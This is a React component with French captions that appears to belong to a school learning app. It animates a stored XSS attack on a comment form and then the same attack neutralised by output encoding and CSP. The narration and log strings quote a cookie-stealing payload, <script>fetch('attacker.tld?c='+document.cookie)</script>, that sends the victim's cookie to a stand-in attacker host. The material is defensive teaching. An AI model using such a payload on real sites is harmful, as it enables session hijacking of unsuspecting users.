import { useEffect, useRef, useState } from "react";
import { AnimControls, useAnimControls } from "./_controls";

/** XSS — attaque & parade. Alterne mode vulnérable (rouge) et protégé (vert). */

type Mode = "vulnerable" | "protected";
type Phase =
  | "idle"
  | "post-payload"
  | "store"
  | "victim-load"
  | "render"
  | "exfil"
  | "blocked"
  | "rest";

interface LogEntry { id: number; text: string; color: string }

const TECH_TAGS = ["XSS stockée", "CSP", "DOMPurify", "Content-Type", "HttpOnly cookie", "Output encoding"];

const PHASE_LABEL: Record<Phase, string> = {
  "idle":         "EN ATTENTE",
  "post-payload": "💉 ATTAQUANT POSTE",
  "store":        "🗄️ SERVEUR STOCKE",
  "victim-load":  "👤 VICTIME OUVRE",
  "render":       "🌐 NAVIGATEUR RENDU",
  "exfil":        "💀 COOKIE EXFILTRÉ",
  "blocked":      "🛡️ ATTAQUE DÉJOUÉE",
  "rest":         "PAUSE",
};

const CYCLES: { mode: Mode; ticks: { phase: Phase; ms: number; log?: { text: string; color: string } }[] }[] = [
  {
    mode: "vulnerable",
    ticks: [
      { phase: "post-payload", ms: 1300, log: { text: "POST /comment {body: '<script>...</script>'}", color: "#f87171" } },
      { phase: "store",        ms: 1100, log: { text: "BDD ← payload stocké tel quel (vuln !)",       color: "#f87171" } },
      { phase: "victim-load",  ms: 1200, log: { text: "GET /comment depuis Bob (innocent)",            color: "#fb923c" } },
      { phase: "render",       ms: 1300, log: { text: "navigateur exécute <script> dans le DOM",       color: "#f87171" } },
      { phase: "exfil",        ms: 1500, log: { text: "💀 fetch('attacker.tld', {c: document.cookie})", color: "#f87171" } },
      { phase: "rest",         ms: 1400, log: { text: "— même attaque, mais avec protection cette fois —", color: "#475569" } },
    ],
  },
  {
    mode: "protected",
    ticks: [
      { phase: "post-payload", ms: 1300, log: { text: "POST /comment {body: '<script>...</script>'}", color: "#f87171" } },
      { phase: "store",        ms: 1100, log: { text: "BDD ← payload échappé : &lt;script&gt;...",     color: "#4ade80" } },
      { phase: "victim-load",  ms: 1200, log: { text: "GET /comment depuis Bob",                       color: "#60a5fa" } },
      { phase: "render",       ms: 1300, log: { text: "navigateur affiche le texte (pas exécuté)",     color: "#4ade80" } },
      { phase: "blocked",      ms: 1500, log: { text: "🛡️ attaque visible mais inerte. Cookie safe.",   color: "#4ade80" } },
      { phase: "rest",         ms: 1400, log: { text: "— et on rejoue —",                              color: "#475569" } },
    ],
  },
];

const NARR_VULN: Record<Phase, { title: string; body: string }> = {
  "idle":         { title: "Le terrain", body: "Un site avec un formulaire de commentaire. Le serveur stocke ce qu'on lui envoie, et le ré-affiche aux autres visiteurs." },
  "post-payload": { title: "L'attaquant prépare son piège", body: "Au lieu d'un vrai commentaire, il poste du code : <script>fetch('attacker.tld?c='+document.cookie)</script>" },
  "store":        { title: "Le serveur stocke tel quel", body: "Bug fatal : aucune sanitization, aucun encodage. Le code malveillant atterit en base de données." },
  "victim-load":  { title: "Une victime visite la page", body: "Bob ouvre la page de commentaires, sans se douter de rien." },
  "render":       { title: "Le navigateur de Bob exécute le script", body: "Pour le navigateur, c'est du HTML légitime venant du serveur. Le <script> tourne avec les droits de Bob." },
  "exfil":        { title: "Le cookie de session de Bob part chez l'attaquant", body: "L'attaquant récupère le cookie, peut maintenant se connecter en tant que Bob." },
  "blocked":      { title: "", body: "" },
  "rest":         { title: "Game over côté Bob", body: "L'attaquant a son compte. Maintenant on regarde comment empêcher ça." },
};

const NARR_PROT: Record<Phase, { title: string; body: string }> = {
  "idle":         { title: "Même site, mais corrigé", body: "Le serveur applique maintenant une parade systématique sur tout input utilisateur." },
  "post-payload": { title: "L'attaquant tente la même chose", body: "Il poste à nouveau <script>fetch(...)</script>. Mais cette fois, il y a un mur." },
  "store":        { title: "Le serveur échappe les caractères dangereux", body: "Le < devient &lt;, le > devient &gt;. Le script devient du texte inerte." },
  "victim-load":  { title: "Bob ouvre la page", body: "Le serveur renvoie le commentaire encodé." },
  "render":       { title: "Le navigateur affiche du texte, pas du HTML", body: "Au lieu d'exécuter, il dessine la chaîne « <script>...</script> » à l'écran." },
  "blocked":      { title: "L'attaque est neutralisée", body: "Le cookie de Bob reste safe. CSP + output encoding = défense en profondeur." },
  "exfil":        { title: "", body: "" },
  "rest":         { title: "C'est l'idée du défensif", body: "Ne jamais faire confiance à l'input utilisateur. Toujours encoder à l'affichage." },
};

function PulsingDot({ color, size = 8 }: { color: string; size?: number }) {
  return (
    <span style={{ position: "relative", display: "inline-block", width: size, height: size }}>
      <span style={{ position: "absolute", inset: 0, borderRadius: "50%", background: color, opacity: 0.4, animation: "tea-ping 1.2s cubic-bezier(0,0,0.2,1) infinite" }} />
      <span style={{ position: "absolute", inset: 0, borderRadius: "50%", background: color }} />
    </span>
  );
}

export default function XssAttaqueAnim() {
  const [cycleIdx, setCycleIdx] = useState(0);
  const [tickIdx, setTickIdx] = useState(0);
  const [log, setLog] = useState<LogEntry[]>([]);
  const timer = useRef<number | null>(null);
  const ctrl = useAnimControls();

  const cycle = CYCLES[cycleIdx];
  const tick = cycle.ticks[tickIdx];
  const mode = cycle.mode;
  const phase = tick.phase;

  useEffect(() => {
    if (tick.log) setLog((p) => [{ id: Date.now() + Math.random(), ...tick.log! }, ...p].slice(0, 12));
    if (ctrl.paused) return;
    timer.current = window.setTimeout(() => {
      if (tickIdx + 1 >= cycle.ticks.length) {
        setTickIdx(0);
        setCycleIdx((c) => (c + 1) % CYCLES.length);
      } else {
        setTickIdx((i) => i + 1);
      }
    }, tick.ms / ctrl.speed);
    return () => { if (timer.current) window.clearTimeout(timer.current); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [cycleIdx, tickIdx, ctrl.speed, ctrl.paused]);

  const phaseColor =
    mode === "protected" && (phase === "blocked" || phase === "render" || phase === "store") ? "#4ade80"
    : mode === "vulnerable" && (phase === "exfil" || phase === "render" || phase === "store") ? "#f87171"
    : phase === "post-payload" ? "#f87171"
    : phase === "victim-load" ? "#60a5fa"
    : "#475569";

  const narr = (mode === "protected" ? NARR_PROT : NARR_VULN)[phase];

  const attackerActive = ["post-payload"].includes(phase) || (mode === "vulnerable" && phase === "exfil");
  const serverActive = ["store", "victim-load"].includes(phase);
  const victimActive = ["victim-load", "render", "exfil", "blocked"].includes(phase);

  const attackerColor = "#ef4444";
  const serverColor = mode === "protected" ? "#22c55e" : "#a855f7";
  const victimColor = mode === "vulnerable" && (phase === "render" || phase === "exfil") ? "#f87171" : "#3b82f6";

  return (
    <div className="tea-root">
      <style>{`
        @keyframes tea-ping { 75%, 100% { transform: scale(2); opacity: 0; } }
        @keyframes tea-slide-in { from { transform: translateY(-8px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes tea-chevron-pulse { from { opacity: 0.15; } to { opacity: 1; } }
        @keyframes tea-badge-morph { 0% { transform: scaleX(1); opacity: 1; } 40% { transform: scaleX(0.15); opacity: 0; } 60% { transform: scaleX(0.15); opacity: 0; } 100% { transform: scaleX(1); opacity: 1; } }
        @keyframes tea-skull { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
        @keyframes tea-shield { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); filter: drop-shadow(0 0 6px #4ade80); } }
        .tea-root { font-family: 'JetBrains Mono', ui-monospace, monospace; color: #94a3b8; background: #090e16; border: 1px solid #1e293b; border-radius: 14px; padding: 20px 16px; max-width: 100%; }
        .tea-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 14px; border-radius: 100px; font-size: 11px; font-weight: 700; letter-spacing: 0.1em; transition: all 0.4s ease; }
        .tea-log { animation: tea-slide-in 0.25s ease; padding: 4px 8px; border-radius: 4px; font-size: 11px; background: #0d1520; border-left: 2px solid; margin-bottom: 4px; }
        @media (min-width: 780px) { .tea-grid { display: grid; grid-template-columns: 1.4fr 1fr; gap: 16px; align-items: start; } }
      `}</style>

      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16, flexWrap: "wrap", gap: 8 }}>
        <span key={phase + mode} className="tea-badge" style={{ background: phaseColor + "15", border: `1px solid ${phaseColor}55`, color: phaseColor, animation: "tea-badge-morph 0.5s ease" }}>
          <PulsingDot color={phaseColor} size={6} />
          {PHASE_LABEL[phase]}
        </span>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <AnimControls ctrl={ctrl} compact />
          <span style={{ fontSize: 10, color: mode === "protected" ? "#4ade80" : "#f87171", letterSpacing: "0.15em", fontWeight: 700 }}>
            {mode === "protected" ? "🛡️ MODE PROTÉGÉ" : "💀 MODE VULNÉRABLE"}
          </span>
        </div>
      </div>

      <div className="tea-grid">
        <div>
          <div style={{ display: "flex", gap: 6, alignItems: "stretch" }}>
            {/* Attacker */}
            <div style={{ flex: 1, minWidth: 0, background: attackerActive ? attackerColor + "18" : "#0d1520", border: `1px solid ${attackerActive ? attackerColor + "88" : "#1e293b"}`, borderRadius: 10, padding: "12px 10px", transition: "all 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 9, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.15em", marginBottom: 8 }}>
                <PulsingDot color={attackerActive ? attackerColor : "#1e293b"} size={6} />
                <span>attaquant</span>
              </div>
              <div style={{ fontSize: 22, marginBottom: 4, display: "inline-block", animation: phase === "exfil" && mode === "vulnerable" ? "tea-skull 0.8s ease-in-out infinite" : "none" }}>🕵️</div>
              <div style={{ fontSize: 10, color: attackerActive ? "#f1f5f9" : "#64748b", fontFamily: "monospace" }}>
                {phase === "post-payload" ? "<script>" : phase === "exfil" && mode === "vulnerable" ? "got cookie!" : "wait..."}
              </div>
            </div>

            {/* Server */}
            <div style={{ flex: 1, minWidth: 0, background: serverActive ? serverColor + "18" : "#0d1520", border: `1px solid ${serverActive ? serverColor + "88" : "#1e293b"}`, borderRadius: 10, padding: "12px 10px", transition: "all 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 9, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.15em", marginBottom: 8 }}>
                <PulsingDot color={serverActive ? serverColor : "#1e293b"} size={6} />
                <span>serveur</span>
              </div>
              <div style={{ fontSize: 22, marginBottom: 4 }}>{mode === "protected" ? "🛡️" : "🖥️"}</div>
              <div style={{ fontSize: 10, color: serverActive ? "#f1f5f9" : "#64748b", fontFamily: "monospace" }}>
                {mode === "protected" ? "escape + encode" : "store as-is"}
              </div>
            </div>

            {/* Victim */}
            <div style={{ flex: 1, minWidth: 0, background: victimActive ? victimColor + "18" : "#0d1520", border: `1px solid ${victimActive ? victimColor + "88" : "#1e293b"}`, borderRadius: 10, padding: "12px 10px", transition: "all 0.4s ease" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 9, color: "#64748b", textTransform: "uppercase", letterSpacing: "0.15em", marginBottom: 8 }}>
                <PulsingDot color={victimActive ? victimColor : "#1e293b"} size={6} />
                <span>victime (Bob)</span>
              </div>
              <div style={{ fontSize: 22, marginBottom: 4, display: "inline-block", animation: phase === "blocked" ? "tea-shield 1s ease-in-out infinite" : "none" }}>
                {phase === "render" && mode === "vulnerable" ? "😱" : phase === "exfil" && mode === "vulnerable" ? "💀" : phase === "blocked" ? "😌" : "👤"}
              </div>
              <div style={{ fontSize: 10, color: victimActive ? "#f1f5f9" : "#64748b", fontFamily: "monospace" }}>
                {phase === "render" && mode === "vulnerable" ? "script exec" : phase === "render" && mode === "protected" ? "text only" : phase === "blocked" ? "safe" : "browse"}
              </div>
            </div>
          </div>

          <div key={phase + mode + "-detail"} style={{ marginTop: 14, background: "#0d1520", border: `1px solid ${phaseColor}44`, borderRadius: 10, padding: "12px 14px", animation: "tea-slide-in 0.35s ease" }}>
            <div style={{ fontSize: 9, color: "#64748b", letterSpacing: "0.15em", textTransform: "uppercase", marginBottom: 4 }}>{mode === "protected" ? "PARADE" : "ATTAQUE"}</div>
            {narr.title && <div style={{ fontSize: 14, color: "#f1f5f9", marginBottom: 4 }}>{narr.title}</div>}
            <div style={{ fontSize: 12, color: "#94a3b8", lineHeight: 1.5 }}>{narr.body}</div>
          </div>
        </div>

        <div>
          <div style={{ marginTop: 14, background: "#0d1520", border: "1px solid #1e293b", borderRadius: 10, padding: 12 }}>
            <div style={{ fontSize: 9, color: "#64748b", letterSpacing: "0.15em", textTransform: "uppercase", marginBottom: 8 }}>LIVE LOG</div>
            <div style={{ maxHeight: 280, overflow: "hidden" }}>
              {log.length === 0 ? <div style={{ fontSize: 11, color: "#1e293b", padding: 4 }}>$ waiting...</div> : log.map((e) => (
                <div key={e.id} className="tea-log" style={{ borderLeftColor: e.color, color: "#cbd5e1" }}>
                  <span style={{ color: e.color }}>›</span> {e.text}
                </div>
              ))}
            </div>
          </div>

          <div style={{ marginTop: 14, display: "flex", flexWrap: "wrap", gap: 6 }}>
            {TECH_TAGS.map((tag) => (
              <span key={tag} style={{ fontSize: 10, color: "#334155", border: "1px solid #1e293b", borderRadius: 100, padding: "3px 10px" }}>#{tag}</span>
            ))}
          </div>
        </div>
      </div>

      <div style={{ marginTop: 16, fontSize: 10, color: "#475569", textAlign: "center", letterSpacing: "0.05em" }}>$ animation auto · lycee-app · xss-attaque</div>
    </div>
  );
}
